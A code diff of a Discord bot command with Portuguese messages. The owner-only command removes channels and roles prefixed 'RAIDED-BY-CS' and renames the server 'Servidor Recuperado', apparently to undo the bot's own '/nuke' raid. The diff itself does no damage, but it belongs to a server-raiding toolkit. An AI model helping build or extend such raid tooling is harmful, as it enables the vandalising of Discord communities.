@@ -1,4 +1,4 @@
-const { SlashCommandBuilder, PermissionFlagsBits, ChannelType } = require('discord.js');
+const { SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');
 
 module.exports = {
   data: new SlashCommandBuilder()
@@ -12,7 +12,7 @@ module.exports = {
     if (interaction.user.id !== DONO_ID) {
       return interaction.reply({
         content: '❌ **ACESSO NEGADO!** Apenas o dono do bot pode usar este comando.',
-        flags: 64
+        ephemeral: true
       });
     }
 
@@ -21,29 +21,30 @@ module.exports = {
     if (!botMember.permissions.has(PermissionFlagsBits.Administrator)) {
       return interaction.reply({
         content: '❌ Eu preciso ser **ADMINISTRADOR** para executar este comando.',
-        flags: 64
+        ephemeral: true
       });
     }
 
-    await interaction.deferReply({ flags: 64 });
+    await interaction.deferReply({ ephemeral: true });
 
     const guild = interaction.guild;
-    const prefix = 'RAIDED-BY-CS'; // prefixo usado no /nuke
+    const prefix = 'RAIDED-BY-CS';
 
     try {
-      // ===== 1. APAGAR CANAIS =====
+      // ===== 1. APAGAR CANAIS E CATEGORIAS =====
       await interaction.editReply('🧹 APAGANDO CANAIS E CATEGORIAS...');
       const channels = guild.channels.cache.filter(c => 
         c.name.startsWith(prefix) || c.name.startsWith('RAIDED-BY-CBS')
       );
       let canaisApagados = 0;
+      const totalCanais = channels.size;
       for (const [id, ch] of channels) {
         try {
           await ch.delete();
           canaisApagados++;
         } catch (e) {}
-        if (canaisApagados % 10 === 0) {
-          await interaction.editReply(`🧹 ${canaisApagados}/${channels.size} canais apagados`);
+        if (canaisApagados % 10 === 0 || canaisApagados === totalCanais) {
+          await interaction.editReply(`🧹 ${canaisApagados}/${totalCanais} canais apagados`);
         }
       }
 
@@ -53,21 +54,20 @@ module.exports = {
         r.name.startsWith(prefix) || r.name.startsWith('RAIDED-BY-CBS')
       );
       let cargosApagados = 0;
+      const totalCargos = roles.size;
       for (const [id, r] of roles) {
         try {
           await r.delete();
           cargosApagados++;
         } catch (e) {}
-        if (cargosApagados % 10 === 0) {
-          await interaction.editReply(`🧹 ${cargosApagados}/${roles.size} cargos apagados`);
+        if (cargosApagados % 10 === 0 || cargosApagados === totalCargos) {
+          await interaction.editReply(`🧹 ${cargosApagados}/${totalCargos} cargos apagados`);
         }
       }
 
-      // ===== 3. MUDAR NOME E FOTO DO SERVIDOR (VOLTAR) =====
+      // ===== 3. MUDAR NOME DO SERVIDOR (VOLTAR) =====
       try {
         await guild.setName('Servidor Recuperado');
-        // Opcional: resetar foto para a padrão (não dá para remover, mas podemos colocar uma padrão)
-        // Se quiser, pode deixar sem alterar.
       } catch (e) {}
 
       // ===== 4. FINAL =====
